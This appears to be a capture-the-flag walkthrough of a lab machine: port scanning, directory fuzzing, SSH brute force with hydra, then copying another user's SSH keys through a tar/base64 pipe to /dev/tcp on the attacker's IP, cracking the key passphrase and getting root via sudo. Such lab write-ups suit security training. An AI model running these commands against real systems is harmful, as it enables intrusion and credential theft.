After starting the box and connecting to the vpn, I done a simple nmap scan:

nmap -sS 10.10.121.173
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 18:12 EDT
Nmap scan report for 10.10.121.173 (10.10.121.173)
Host is up (0.43s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

There is 3 interesting services running on the target host, ssh, http and smb.

taking a look on the service http on port 80 with curl, we can see a message left to the developers:

<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>

<!-- Check our dev note section if you need to know what to work on. -->


</html>

we got a clue that on the 'dev not section' might have something important
with ffuf I found that there is a directory called 'development':

development   [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 337ms]

taking a look on this directory I've found 2 files:
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="dev.txt">dev.txt</a></td><td align="right">2018-04-23 14:52  </td><td align="right">483 </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="j.txt">j.txt</a></td><td align="right">2018-04-23 13:10  </td><td align="right">235 </td><td>&nbsp;</td></tr>
dev.txt and j.txt; taking a look at both files:

<--- dev.txt --->
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J

<--- j.txt --->
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K

we see that the user 'J' has a weak password, meaning we could brute force it with hydra.

while I was waiting for the fuzzing to finish, I used enum4linux to enumerate the smb service, I have found 2 users:
S-1-22-1-1000 Unix User\kay (Local User)                                                                                                                    
S-1-22-1-1001 Unix User\jan (Local User)

using hydra we found a password for jan, as the note above attempt to alert the user jan:
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.121.173 
[22][ssh] host: 10.10.121.173   login: jan   password: [redacted]

after ssh into the box we see two users on the home page:
jan@basic2:/home$ ls -l
total 8
drwxr-xr-x 2 root root 4096 Apr 23  2018 jan
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 kay

taking a look on kay's home directory we found a backup file:

jan@basic2:/home/kay$ ls
pass.bak
jan@basic2:/home/kay$ cat pass.bak 
cat: pass.bak: Permission denied

sadly we don't have permissions to read it. we'll have to escalate the privilege
after listing all the files on the folderm we found a .ssh directory

jan@basic2:/home/kay$ ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .lesshst  .nano  pass.bak  .profile  .ssh  .sudo_as_admin_successful  .viminfo
inside we find 3 files:
jan@basic2:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
<----->
using a netcat listener we transfered the files to our attacking machine:
nc -lvp 1337 > file.out

<----->
one the target system, we ran this code to get the contents of .ssh
jan@basic2:/home/kay/.ssh$ tar zcf - * | base64 | dd conv=ebcdic > /dev/tcp/10.13.42.7/1337
8+1 records in
8+1 records out
4531 bytes (4.5 kB, 4.4 KiB) copied, 0.000241136 s, 18.8 MB/s

<----->
we just need to decrypt the files:

dd conv=ascii if=file.out | base64 -d | tar xzvf - 
8+1 records in
8+1 records out
4531 bytes (4.5 kB, 4.4 KiB) copied, 0.000847183 s, 5.3 MB/s
authorized_keys
id_rsa
id_rsa.pub

ls
authorized_keys  file.out  id_rsa  id_rsa.pub

we use ssh2john to bruteforce the password of id_rsa:
ssh2john id_rsa > johnme
after cracking it we find the password:
john -show johnme 
id_rsa:[redacted]

now we can login into the machine with kay:
ssh -i id_rsa kay@10.10.121.173

kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
[redacted]
kay@basic2:~$ sudo su
[sudo] password for kay: 
root@basic2:/home/kay# 

we got root!
